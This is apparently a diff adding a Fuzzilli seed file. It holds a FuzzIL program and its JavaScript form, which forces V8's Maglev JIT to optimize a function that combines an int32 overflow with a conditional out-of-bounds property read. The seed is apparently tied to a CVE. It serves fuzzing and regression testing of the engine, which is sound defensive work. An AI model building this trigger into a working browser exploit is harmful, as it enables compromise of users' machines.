@@ -1,0 +1,56 @@
+v0 <- BeginPlainFunction -> v1
+    BeginObjectLiteral
+    v2 <- EndObjectLiteral
+    v3 <- CreateNamedVariable 'o', 'let', v2
+    v4 <- LoadInteger '1'
+    v5 <- LoadInteger '2147483648'
+    v6 <- TernaryOperation v1, v4, v5
+    v7 <- LoadInteger '0'
+    v8 <- BinaryOperation v6, '|', v7
+    v9 <- CreateNamedVariable 'mul', 'let', v8
+    v10 <- CreateNamedVariable 'print', 'none'
+    v11 <- CallFunction v10, [v9]
+    v12 <- LoadInteger '2'
+    v13 <- BinaryOperation v9, '*', v12
+    v14 <- LoadInteger '0'
+    v15 <- BinaryOperation v13, '|', v14
+    v16 <- CreateNamedVariable 'idx', 'let', v15
+    v17 <- CallFunction v10, [v16]
+    v18 <- LoadFloat '1.1'
+    SetElement v3, '0', v18
+    BeginIf v1 -> v19
+        v20 <- LoadFloat '2.2'
+        SetElement v3, '1', v20
+    EndIf
+    v21 <- GetComputedProperty v3, v16
+    Return v21
+EndPlainFunction
+v22 <- Eval '%PrepareFunctionForOptimization(%@)', [v0]
+v23 <- LoadBoolean 'true'
+v24 <- CallFunction v0, [v23]
+v25 <- LoadBoolean 'false'
+v26 <- CallFunction v0, [v25]
+v27 <- Eval '%OptimizeMaglevOnNextCall(%@)', [v0]
+v28 <- LoadBoolean 'false'
+v29 <- CallFunction v0, [v28]
+
+
+function trigger(a1) {
+    let o = {};
+    let mul = (a1 ? 1 : 2147483648) | 0;
+    print(mul);
+    let idx = (mul * 2) | 0;
+    print(idx);
+    o[0] = 1.1;
+    if (a1) {
+        o[1] = 2.2;
+    }
+    return o[idx];
+}
+const v22 = %PrepareFunctionForOptimization(trigger);
+trigger(true);
+trigger(false);
+const v27 = %OptimizeMaglevOnNextCall(trigger);
+trigger(false);
+
+FuzzIL program written to /v8/fuzzilli/seed_cve2025_2026/test14.fzil
